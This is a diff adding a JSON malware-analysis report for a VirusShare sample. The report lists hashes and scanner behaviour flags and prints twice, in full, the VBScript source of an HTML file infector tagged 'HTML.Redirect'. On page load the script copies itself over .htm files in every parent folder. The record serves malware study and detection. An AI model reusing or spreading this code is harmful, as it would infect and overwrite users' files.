@@ -1,0 +1,76 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Call": "May call a DLL using Excel 4 Macros",
+            "CopyFile": "May copy a file",
+            "CreateObject": "May create an OLE object"
+        },
+        "macro": "<html>\n<head>\n<meta http-equiv=\"Content-Type\"\ncontent=\"text/html; charset=iso-8859-1\">\n<meta name=\"Author\" content=\"1nternal\">\n<title></title>\n</head>\n\n<BODY Onload=\"Redirect();\">\n<script language=\"VBScript\"><!--\n\nSub Redirect\n\tRandomize\n\tIf location.protocol = \"file:\" AND (Int((6 * Rnd) + 1) = 1) then Call Offline\n\tlocation.href = location.href +\"l\"\nEnd Sub\n\nSub Offline\n\tDim FSO,folder ,fc, f1, cpath\n\tSet FSO = CreateObject(\"Scripting.FileSystemObject\")\n\tHostPath = Replace(location.href, \"file:///\", \"\")\n\tHostPath = Replace(HostPath, \"/\", \"\\\")\n\tcpath = fso.GetParentFolderName(HostPath)\n\tSet folder = fso.GetFolder(cpath)\n\n\tWhile folder.IsRootFolder = false \n\t\tSet folder = fso.GetFolder(cpath)\n\t\tSet fc = folder.Files\n\t\tcpath = fso.GetParentFolderName(cpath)\n\t\tFor each f1 in fc\n\t\t\ts = Lcase(Fso.GetExtensionName(f1.name))\n\t\t\tIf s = \"htm\" and fso.FileExists(f1.path+\"l\") = False then \n\t\t\t\tfso.CopyFile f1.path, f1.path+\"l\", true\n\t\t\t\tfso.CopyFile HostPath, f1.path, true\n\t\t\tEnd If\n\t\tNext\n\tWend\n\tIf (Int((10 * Rnd) + 1) + 1) = 1 Then MsgBox(\"HTML.Redirect /1nternal\")\nEnd Sub\n--></script>\n</BODY>\n</html>"
+    },
+    "filename": "VirusShare_3be378536b77b0e59691b8c4bb524bc0",
+    "filesize": 1152,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3be378536b77b0e59691b8c4bb524bc0",
+        "sha1": "079d8ae2b28bb19e12adc2b67e718cfee3012010",
+        "sha256": "025d9c464251b01df0845360bd4470ee2c7e746e666ae429448f55412b1ceae7"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<html>",
+            "<head>",
+            "<meta http-equiv=\"Content-Type\"",
+            "content=\"text/html; charset=iso-8859-1\">",
+            "<meta name=\"Author\" content=\"1nternal\">",
+            "<title></title>",
+            "</head>",
+            "<BODY Onload=\"Redirect();\">",
+            "<script language=\"VBScript\"><!--",
+            "Sub Redirect",
+            "\tRandomize",
+            "\tIf location.protocol = \"file:\" AND (Int((6 * Rnd) + 1) = 1) then Call Offline",
+            "\tlocation.href = location.href +\"l\"",
+            "End Sub",
+            "Sub Offline",
+            "\tDim FSO,folder ,fc, f1, cpath",
+            "\tSet FSO = CreateObject(\"Scripting.FileSystemObject\")",
+            "\tHostPath = Replace(location.href, \"file:///\", \"\")",
+            "\tHostPath = Replace(HostPath, \"/\", \"\\\")",
+            "\tcpath = fso.GetParentFolderName(HostPath)",
+            "\tSet folder = fso.GetFolder(cpath)",
+            "\tWhile folder.IsRootFolder = false ",
+            "\t\tSet folder = fso.GetFolder(cpath)",
+            "\t\tSet fc = folder.Files",
+            "\t\tcpath = fso.GetParentFolderName(cpath)",
+            "\t\tFor each f1 in fc",
+            "\t\t\ts = Lcase(Fso.GetExtensionName(f1.name))",
+            "\t\t\tIf s = \"htm\" and fso.FileExists(f1.path+\"l\") = False then ",
+            "\t\t\t\tfso.CopyFile f1.path, f1.path+\"l\", true",
+            "\t\t\t\tfso.CopyFile HostPath, f1.path, true",
+            "\t\t\tEnd If",
+            "\t\tNext",
+            "\tWend",
+            "\tIf (Int((10 * Rnd) + 1) + 1) = 1 Then MsgBox(\"HTML.Redirect /1nternal\")",
+            "End Sub",
+            "--></script>",
+            "</BODY>",
+            "</html>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "file:///"
+        ]
+    },
+    "time": "0:00:00.262679",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
